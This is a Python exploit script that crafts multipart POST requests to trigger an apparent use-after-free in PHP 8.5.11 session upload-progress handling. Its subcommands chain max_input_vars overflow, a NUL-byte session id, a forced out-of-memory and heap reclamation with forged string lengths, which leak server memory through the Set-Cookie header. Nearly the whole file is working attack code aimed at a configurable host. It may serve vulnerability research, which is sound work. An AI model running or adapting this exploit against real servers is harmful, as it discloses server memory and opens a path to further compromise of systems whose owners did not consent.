#!/usr/bin/env python3
"""nb_leak.py - 9bie Set-Cookie leak request builder for the PHP 8.5.11 port.

Two requests per leak cycle, both ordinary multipart/form-data POSTs to a plain
`<?php echo "OK\\n"; ?>` page:

  a  leak-A: NVARS ordinary fields (trips max_input_vars -> headers_sent with
     display_errors=On), PHPSESSID = single NUL byte (forces a new random id and
     leaves send_cookie=1), the upload-progress marker, one file part
     (FILE_START session init), then a huge ordinary field that OOMs inside
     php_request_startup.  Leaves PS(id) dangling + send_cookie=1.

  b  leak-B: PHPSESSID + upload-progress (no file part) so the pre-RINIT END
     cleanup runs php_session_initialize(); reset_id then url-encodes the stale
     PS(id).  The N field values are sized to reclaim the stale block:
       --forge-len L  puts little-endian L at value offset 0x10, so a multipart
                      raw buffer landing at the stale block forges
                      ZSTR_LEN=L (data starts at block+0x18 = value[0x18]).

Usage (host/port before the subcommand):
  nb_leak.py --host 10.209.61.2 --port 80 a --nvars 1001 --val-len 39 --huge 24
  nb_leak.py --host 10.209.61.2 --port 80 b --n 900 --val-len 56 --forge-len 0x1000

Prints the status, byte counts and the Set-Cookie value (raw) when present.
"""
import argparse
import socket
import struct
import sys
import time


def multipart(parts, boundary):
    o = bytearray()
    for p in parts:
        o += b"--" + boundary + b"\r\n"
        if p.get("filename") is not None:
            o += (b'Content-Disposition: form-data; name="' + p["name"]
                  + b'"; filename="' + p["filename"] + b'"\r\n'
                  b'Content-Type: application/octet-stream\r\n\r\n')
        else:
            o += b'Content-Disposition: form-data; name="' + p["name"] + b'"\r\n\r\n'
        o += p["data"] + b"\r\n"
    o += b"--" + boundary + b"--\r\n"
    return bytes(o)


def field(name, data):
    return {"name": name if isinstance(name, bytes) else name.encode(), "data": data}


def filefield(name, filename, data):
    return {"name": name.encode(), "filename": filename.encode(), "data": data}


def send_raw(host, port, path, body, boundary, timeout=60.0):
    hdr = (
        "POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\nConnection: close\r\n\r\n"
        % (path, host, port, boundary.decode("latin1"), len(body))
    ).encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    send_err = recv_err = None
    t0 = time.time()
    try:
        s.sendall(hdr)
        mv = memoryview(body)
        for off in range(0, len(body), 262144):
            try:
                s.sendall(mv[off:off + 262144])
            except OSError as e:
                send_err = repr(e)
                break
    except OSError as e:
        send_err = repr(e)
    data = bytearray()
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except OSError as e:
        recv_err = repr(e)
    finally:
        s.close()
    dt = time.time() - t0
    head, sep, rest = bytes(data).partition(b"\r\n\r\n")
    lines = head.split(b"\r\n") if head else []
    status = lines[0].decode("latin1", "replace") if lines else "<no head>"
    cookies = []
    for ln in lines[1:]:
        if ln.lower().startswith(b"set-cookie:"):
            cookies.append(ln.split(b":", 1)[1].strip())
    return {"status": status, "bytes": len(body), "resp_bytes": len(data),
            "elapsed": round(dt, 3), "send_err": send_err, "recv_err": recv_err,
            "cookies": cookies, "raw": bytes(data)}


def report(tag, r, save):
    print("%s status=%r req=%d resp=%d elapsed=%s send_err=%s recv_err=%s ncookies=%d"
          % (tag, r["status"], r["bytes"], r["resp_bytes"], r["elapsed"],
             r["send_err"], r["recv_err"], len(r["cookies"])))
    for c in r["cookies"]:
        print("  COOKIE %r" % c[:400])
    if save:
        open(save, "wb").write(r["raw"])


def cmd_a(args):
    parts = []
    for i in range(args.nvars):
        if args.name_mix_pos == "last":
            mix = i >= args.nvars - args.name_mix
        else:
            mix = i < args.name_mix
        nl = args.name_len2 if mix else args.name_len
        nm = ("f%0*d" % (max(0, nl - 1), i))[:nl]
        vl = args.val_short_len if i == args.val_short_idx else args.val_len
        parts.append(field(nm, b"x" * max(0, vl)))
    parts.append(field("PHPSESSID", b"\x00"))
    parts.append(field("PHP_SESSION_UPLOAD_PROGRESS", b"p" * args.prog_len))
    parts.append(filefield("f", "a.txt", b"A" * 64))
    parts.append(field("big", b"B" * (args.huge * 1024 * 1024)))
    boundary = b"S" * (args.bnd_len or 17)
    body = multipart(parts, boundary)
    return send_raw(args.host, args.port, args.path, body, boundary, args.timeout)


def value_for(i, args):
    v = bytearray(b"x" * args.val_len)
    tag = (b"V%04d" % i)
    v[0:len(tag)] = tag
    if args.forge_len is not None:
        lo = args.forge_len_off
        struct.pack_into("<Q", v, lo, args.forge_len)
        if args.forge_tag:
            t = args.forge_tag.encode()
            v[lo + 8:lo + 8 + len(t)] = t[:(len(v) - lo - 8)]
    return bytes(v)


def cmd_b(args):
    parts = [field("PHPSESSID", args.sid.encode()),
             field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(args.pre):
        parts.append(field("q%04d" % i, b"q" * args.pre_len))
    for i in range(args.n):
        nm = ("a%0*d" % (max(0, args.name_len - 1), i))[:args.name_len]
        parts.append(field(nm, value_for(i + args.start, args)))
    boundary = b"B" * 10
    body = multipart(parts, boundary)
    return send_raw(args.host, args.port, args.path, body, boundary, args.timeout)


def cmd_barr(args):
    parts = [field("PHPSESSID", args.sid.encode()),
             field("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(args.n):
        cnt = args.m if (args.target < 0 or i == args.target) else 1
        for j in range(cnt):
            parts.append(field("a%04d[%d]" % (i, j), b"x"))
    boundary = b"B" * 10
    body = multipart(parts, boundary)
    return send_raw(args.host, args.port, args.path, body, boundary, args.timeout)


def cmd_get(args):
    s = socket.create_connection((args.host, args.port), timeout=args.timeout)
    s.sendall(("GET %s HTTP/1.0\r\nHost: %s:%d\r\nConnection: close\r\n\r\n"
               % (args.path, args.host, args.port)).encode())
    data = b""
    s.settimeout(args.timeout)
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except OSError:
        pass
    s.close()
    print("GET resp=%d" % len(data))
    return {"raw": data, "cookies": [], "status": "", "bytes": 0,
            "resp_bytes": len(data), "elapsed": 0, "send_err": None, "recv_err": None}


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--timeout", type=float, default=60.0)
    ap.add_argument("--save")
    sub = ap.add_subparsers(dest="mode", required=True)

    a = sub.add_parser("a")
    a.add_argument("--nvars", type=int, default=1001)
    a.add_argument("--name-len", type=int, default=5)
    a.add_argument("--name-len2", type=int, default=39)
    a.add_argument("--name-mix", type=int, default=0)
    a.add_argument("--name-mix-pos", choices=["first", "last"], default="first")
    a.add_argument("--val-len", type=int, default=39)
    a.add_argument("--val-short-idx", type=int, default=-1)
    a.add_argument("--val-short-len", type=int, default=31)
    a.add_argument("--prog-len", type=int, default=3)
    a.add_argument("--bnd-len", type=int, default=17)
    a.add_argument("--huge", type=int, default=24)
    a.set_defaults(func=cmd_a)

    b = sub.add_parser("b")
    b.add_argument("--n", type=int, default=0)
    b.add_argument("--name-len", type=int, default=5)
    b.add_argument("--val-len", type=int, default=56)
    b.add_argument("--forge-len", type=lambda x: int(x, 0), default=None)
    b.add_argument("--forge-tag", default="LK")
    b.add_argument("--forge-len-off", type=lambda x: int(x, 0), default=0x10)
    b.add_argument("--start", type=int, default=0)
    b.add_argument("--pre", type=int, default=0)
    b.add_argument("--pre-len", type=int, default=8)
    b.add_argument("--sid", default="leaksessionid01")
    b.set_defaults(func=cmd_b)

    ba = sub.add_parser("barr")
    ba.add_argument("--target", type=int, default=443)
    ba.add_argument("--m", type=int, default=16)
    ba.add_argument("--n", type=int, default=998)
    ba.add_argument("--sid", default="leaksessionid01")
    ba.set_defaults(func=cmd_barr)

    g = sub.add_parser("get")
    g.set_defaults(func=cmd_get)

    args = ap.parse_args()
    r = args.func(args)
    if args.mode != "get":
        report(args.mode.upper(), r, args.save)


if __name__ == "__main__":
    main()
